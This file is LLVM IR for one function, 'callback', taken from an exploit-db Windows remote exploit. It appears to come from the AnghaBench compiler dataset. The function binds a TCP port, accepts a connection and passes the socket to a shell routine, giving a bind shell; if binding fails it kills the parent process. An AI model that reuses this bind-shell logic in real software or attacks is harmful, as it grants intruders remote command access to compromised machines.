; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_297.c_callback.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_297.c_callback.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i64 }
%struct.sockaddr = type { i32 }

@SIGKILL = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"[-] shell.bind\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"crap\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @callback(i16 signext %0) #0 {
  %2 = alloca i16, align 2
  %3 = alloca %struct.sockaddr_in, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i16 %0, i16* %2, align 2
  store i32 16, i32* %5, align 4
  %6 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i32 2, i32* %6, align 8
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %8 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %7, i32 0, i32 0
  store i64 0, i64* %8, align 8
  %9 = load i16, i16* %2, align 2
  %10 = call i32 @htons(i16 signext %9)
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i32 %10, i32* %11, align 4
  %12 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %15 = call i64 @bind(i32 %13, %struct.sockaddr* %14, i32 16)
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %22

17:                                               ; preds = %1
  %18 = call i32 (...) @getppid()
  %19 = load i32, i32* @SIGKILL, align 4
  %20 = call i32 @kill(i32 %18, i32 %19)
  %21 = call i32 @fatal(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  br label %22

22:                                               ; preds = %17, %1
  %23 = load i32, i32* %4, align 4
  %24 = call i32 @listen(i32 %23, i32 1)
  %25 = load i32, i32* %4, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @accept(i32 %25, %struct.sockaddr* %26, i32* %5)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = call i32 @shell(i32 %28)
  %30 = call i32 @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  ret void
}

declare dso_local i32 @htons(i16 signext) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @getppid(...) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @shell(i32) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
